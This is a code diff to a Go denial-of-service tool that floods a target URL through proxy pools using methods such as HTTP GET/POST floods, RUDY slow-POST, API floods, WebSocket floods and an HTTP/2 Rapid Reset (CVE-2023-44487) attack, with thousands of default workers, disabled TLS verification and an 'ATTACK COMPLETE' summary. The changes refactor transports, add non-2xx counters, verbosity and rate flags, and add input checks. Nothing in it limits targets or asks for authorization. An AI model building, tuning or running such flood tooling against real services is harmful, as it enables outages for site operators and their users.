@@ -635,7 +635,7 @@ func loadProxies(filename string) ([]string, error) {
 	var lines []string
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
-		if line := scanner.Text(); line != "" {
+		if line := strings.TrimSpace(scanner.Text()); line != "" {
 			lines = append(lines, line)
 		}
 	}
@@ -646,6 +646,42 @@ func loadProxies(filename string) ([]string, error) {
 		return nil, fmt.Errorf("no proxies found in %s", filename)
 	}
 	return lines, nil
+}
+
+const (
+	dialTimeout           = 5 * time.Second
+	responseHeaderTimeout = 10 * time.Second
+	clientTimeout         = 10 * time.Second
+	keepAliveInterval     = 30 * time.Second
+	idleConnTimeout       = 90 * time.Second
+	maxIdleConns          = 500
+	maxIdleConnsPerHost   = 250
+	maxConnsPerHost       = 250
+	maxClientsPerProxy    = 64
+	maxDirectPool         = 256
+)
+
+func newTransport(proxyURL *url.URL) *http.Transport {
+	t := &http.Transport{
+		DialContext: (&net.Dialer{
+			Timeout:   dialTimeout,
+			KeepAlive: keepAliveInterval,
+		}).DialContext,
+		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12},
+		TLSHandshakeTimeout:   dialTimeout,
+		MaxIdleConns:          maxIdleConns,
+		MaxIdleConnsPerHost:   maxIdleConnsPerHost,
+		MaxConnsPerHost:       maxConnsPerHost,
+		IdleConnTimeout:       idleConnTimeout,
+		ResponseHeaderTimeout: responseHeaderTimeout,
+		DisableKeepAlives:     false,
+		DisableCompression:    true,
+		ForceAttemptHTTP2:     false,
+	}
+	if proxyURL != nil {
+		t.Proxy = http.ProxyURL(proxyURL)
+	}
+	return t
 }
 
 func buildClientPool(proxies []string, workers int) ([]*http.Client, error) {
@@ -665,8 +701,8 @@ func buildClientPool(proxies []string, workers int) ([]*http.Client, error) {
 	if clientsPerProxy < 1 {
 		clientsPerProxy = 1
 	}
-	if clientsPerProxy > 64 {
-		clientsPerProxy = 64
+	if clientsPerProxy > maxClientsPerProxy {
+		clientsPerProxy = maxClientsPerProxy
 	}
 	clients := make([]*http.Client, 0, len(unique)*clientsPerProxy)
 
@@ -678,27 +714,8 @@ func buildClientPool(proxies []string, workers int) ([]*http.Client, error) {
 		}
 		for i := 0; i < clientsPerProxy; i++ {
 			c := &http.Client{
-				Transport: &http.Transport{
-					Proxy: http.ProxyURL(proxyURL),
-					DialContext: (&net.Dialer{
-						Timeout:   5 * time.Second,
-						KeepAlive: 30 * time.Second,
-					}).DialContext,
-					TLSClientConfig: &tls.Config{
-						InsecureSkipVerify: true,
-						MinVersion:         tls.VersionTLS12,
-					},
-					TLSHandshakeTimeout:   5 * time.Second,
-					MaxIdleConns:          500,
-					MaxIdleConnsPerHost:   250,
-					MaxConnsPerHost:       250,
-					IdleConnTimeout:       90 * time.Second,
-					ResponseHeaderTimeout: 10 * time.Second,
-					DisableKeepAlives:     false,
-					DisableCompression:    true,
-					ForceAttemptHTTP2:     false,
-				},
-				Timeout: 10 * time.Second,
+				Transport: newTransport(proxyURL),
+				Timeout:   clientTimeout,
 				CheckRedirect: func(req *http.Request, via []*http.Request) error {
 					if len(via) >= 3 {
 						return http.ErrUseLastResponse
@@ -719,26 +736,8 @@ func buildDirectPool(count int) []*http.Client {
 	clients := make([]*http.Client, 0, count)
 	for i := 0; i < count; i++ {
 		c := &http.Client{
-			Transport: &http.Transport{
-				DialContext: (&net.Dialer{
-					Timeout:   5 * time.Second,
-					KeepAlive: 30 * time.Second,
-				}).DialContext,
-				TLSClientConfig: &tls.Config{
-					InsecureSkipVerify: true,
-					MinVersion:         tls.VersionTLS12,
-				},
-				TLSHandshakeTimeout:   5 * time.Second,
-				MaxIdleConns:          500,
-				MaxIdleConnsPerHost:   250,
-				MaxConnsPerHost:       250,
-				IdleConnTimeout:       90 * time.Second,
-				ResponseHeaderTimeout: 10 * time.Second,
-				DisableKeepAlives:     false,
-				DisableCompression:    true,
-				ForceAttemptHTTP2:     false,
-			},
-			Timeout: 10 * time.Second,
+			Transport: newTransport(nil),
+			Timeout:   clientTimeout,
 			CheckRedirect: func(req *http.Request, via []*http.Request) error {
 				if len(via) >= 3 {
 					return http.ErrUseLastResponse
@@ -758,6 +757,9 @@ func httpGet(url string, client *http.Client) error {
 	}
 	io.Copy(io.Discard, resp.Body)
 	resp.Body.Close()
+	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
+		totalNonSucc.Add(1)
+	}
 	return nil
 }
 
@@ -854,6 +856,9 @@ func httpPost(targetURL string, client *http.Client) error {
 	}
 	io.Copy(io.Discard, resp.Body)
 	resp.Body.Close()
+	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
+		totalNonSucc.Add(1)
+	}
 	return nil
 }
 
@@ -926,8 +931,9 @@ func httpRudy(targetURL string, client *http.Client, stop <-chan struct{}) error
 	return nil
 }
 
-var totalSent atomic.Int64
-var totalErrors atomic.Int64
+var totalSent    atomic.Int64
+var totalErrors  atomic.Int64
+var totalNonSucc atomic.Int64
 var proxyList []string // set in main, used by rapid reset
 
 // ── HTTP/2 Rapid Reset (CVE-2023-44487) ──
@@ -944,7 +950,7 @@ func httpRapidReset(targetURL string, stop <-chan struct{}) error {
 		if u.Scheme == "https" {
 			port = "443"
 		} else {
-			port = "443" // force TLS for h2
+			port = "80"
 		}
 	}
 	addr := net.JoinHostPort(host, port)
@@ -1314,10 +1320,13 @@ func httpAPIFlood(targetURL string, client *http.Client) error {
 	}
 	io.Copy(io.Discard, resp.Body)
 	resp.Body.Close()
+	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
+		totalNonSucc.Add(1)
+	}
 	return nil
 }
 
-func Worker(id int, targetURL string, method string, clients []*http.Client, stop <-chan struct{}) {
+func Worker(id int, targetURL string, method string, clients []*http.Client, stop <-chan struct{}, verbose bool, rateMS int) {
 	client := clients[id%len(clients)]
 	for {
 		select {
@@ -1350,9 +1359,15 @@ func Worker(id int, targetURL string, method string, clients []*http.Client, sto
 
 		if err != nil {
 			totalErrors.Add(1)
+			if verbose {
+				fmt.Fprintf(os.Stderr, "[worker %d] %v\n", id, err)
+			}
 			continue
 		}
 		totalSent.Add(1)
+		if rateMS > 0 {
+			time.Sleep(time.Duration(rateMS) * time.Millisecond)
+		}
 	}
 }
 func main() {
@@ -1361,6 +1376,8 @@ func main() {
 	workerCount := flag.Int("w", 2048, "number of workers")
 	dur := flag.Int("d", 30, "duration in seconds")
 	pFile := flag.String("p", "", "proxy file path (optional, direct if omitted)")
+	verbose := flag.Bool("v", false, "print request errors to stderr")
+	rateDelay := flag.Int("r", 0, "delay in ms between requests per worker (0 = unlimited)")
 	flag.Parse()
 
 	if *target == "" {
@@ -1398,6 +1415,21 @@ func main() {
 		fmt.Fprintf(os.Stderr, "\n  \033[31m✗\033[0m Unknown method: %s\n", *method)
 		fmt.Fprintf(os.Stderr, "  Valid methods: httpget | httppost | rudy | apiflood | rapidreset | wsflood\n\n")
 		os.Exit(1)
+	}
+	if workers < 1 {
+		fmt.Fprintf(os.Stderr, "\n  \033[31m✗\033[0m -w must be >= 1\n\n")
+		os.Exit(1)
+	}
+	if duration < 1 {
+		fmt.Fprintf(os.Stderr, "\n  \033[31m✗\033[0m -d must be >= 1\n\n")
+		os.Exit(1)
+	}
+	{
+		parsedTarget, err := url.Parse(targetURL)
+		if err != nil || (parsedTarget.Scheme != "http" && parsedTarget.Scheme != "https") {
+			fmt.Fprintf(os.Stderr, "\n  \033[31m✗\033[0m target must start with http:// or https://\n\n")
+			os.Exit(1)
+		}
 	}
 
 	// ANSI color codes
@@ -1458,6 +1490,10 @@ func main() {
 	var clients []*http.Client
 
 	if proxyFile != "" {
+		if _, err := os.Stat(proxyFile); err != nil {
+			fmt.Fprintf(os.Stderr, "\n  \033[31m✗\033[0m proxy file not found: %s\n\n", proxyFile)
+			os.Exit(1)
+		}
 		// Proxied mode — load proxies once
 		done := make(chan []string)
 		go func() {
@@ -1514,8 +1550,8 @@ func main() {
 			if poolSize < 4 {
 				poolSize = 4
 			}
-			if poolSize > 256 {
-				poolSize = 256
+			if poolSize > maxDirectPool {
+				poolSize = maxDirectPool
 			}
 			fmt.Printf("\r  %s✓%s Direct mode (no proxies)\n", green, reset)
 			clients = buildDirectPool(poolSize)
@@ -1543,7 +1579,7 @@ func main() {
 	}
 
 	for i := 0; i < workers; i++ {
-		go Worker(i, targetURL, *method, clients, stop)
+		go Worker(i, targetURL, *method, clients, stop, *verbose, *rateDelay)
 	}
 
 	fmt.Printf("  %s%s▸%s %s%d%s workers launched → %s%s%s for %s%ds%s\n\n",
@@ -1561,14 +1597,20 @@ func main() {
 			elapsed := time.Since(start).Seconds()
 			sent := totalSent.Load()
 			errs := totalErrors.Load()
+			nonSucc := totalNonSucc.Load()
 			rps := float64(sent) / elapsed
 			errColor := green
 			if errs > 0 {
 				errColor = red
 			}
-			fmt.Printf("\r  %s[%.0fs]%s Sent: %s%d%s │ Errors: %s%d%s │ RPS: %s%.0f%s   ",
+			nonSuccColor := green
+			if nonSucc > 0 {
+				nonSuccColor = yellow
+			}
+			fmt.Printf("\r  %s[%.0fs]%s Sent: %s%d%s │ Non-2xx: %s%d%s │ Errors: %s%d%s │ RPS: %s%.0f%s   ",
 				dim, elapsed, reset,
 				bold+green, sent, reset,
+				bold+nonSuccColor, nonSucc, reset,
 				bold+errColor, errs, reset,
 				bold+cyan, rps, reset)
 		}
@@ -1579,6 +1621,7 @@ func main() {
 
 	sent := totalSent.Load()
 	errs := totalErrors.Load()
+	nonSuccFinal := totalNonSucc.Load()
 	avgRPS := float64(sent) / float64(duration)
 	fmt.Println()
 	fmt.Println()
@@ -1586,6 +1629,7 @@ func main() {
 	fmt.Println(dim + "  │" + bold + red + "             ATTACK COMPLETE              " + reset + dim + "│" + reset)
 	fmt.Println(dim + "  ├─────────────────────────────────────────┤" + reset)
 	fmt.Printf(dim+"  │"+reset+" "+green+"SENT"+reset+"     %-34d"+dim+"│"+reset+"\n", sent)
+	fmt.Printf(dim+"  │"+reset+" "+yellow+"NON-2XX"+reset+"  %-34d"+dim+"│"+reset+"\n", nonSuccFinal)
 	fmt.Printf(dim+"  │"+reset+" "+red+"ERRORS"+reset+"   %-34d"+dim+"│"+reset+"\n", errs)
 	fmt.Printf(dim+"  │"+reset+" "+cyan+"AVG RPS"+reset+"  %-34.0f"+dim+"│"+reset+"\n", avgRPS)
 	fmt.Printf(dim+"  │"+reset+" "+yellow+"DURATION"+reset+" %-34s"+dim+"│"+reset+"\n", fmt.Sprintf("%ds", duration))
